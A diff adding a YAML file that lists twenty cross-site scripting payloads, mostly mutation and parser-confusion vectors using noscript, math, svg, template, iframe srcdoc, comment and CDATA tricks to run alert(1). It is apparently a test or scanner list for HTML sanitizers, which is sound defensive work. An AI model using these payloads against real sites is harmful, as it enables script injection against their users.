@@ -1,0 +1,21 @@
+payloads:
+- <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+- <noscript><style></noscript><img src=x onerror=alert(1)>
+- <noscript><textarea></noscript><img src=x onerror=alert(1)>
+- <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+- <math><mtext><table><mglyph><svg><style><img src=x onerror=alert(1)>
+- <svg><foreignObject><div><svg><script>alert(1)</script>
+- <svg><desc><svg><script>alert(1)</script>
+- <svg><title><svg><script>alert(1)</script>
+- <template><style><img src=x onerror=alert(1)></template>
+- <template><script>alert(1)</script></template>
+- <frameset onload=alert(1)><frame src=javascript:alert(1)>
+- <xmp><p title="</xmp><img src=x onerror=alert(1)>">
+- <listing><p title="</listing><img src=x onerror=alert(1)>">
+- <plaintext><img src=x onerror=alert(1)>
+- <iframe srcdoc="<script>parent.alert(1)</script>">
+- <iframe srcdoc="<img src=x onerror=parent.alert(1)>">
+- <!--<img src="--><img src=x onerror=alert(1)//">
+- <!--[if IE]><img src=x onerror=alert(1)><![endif]-->
+- <![CDATA[<script>alert(1)</script>]]>
+- <svg><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></svg>
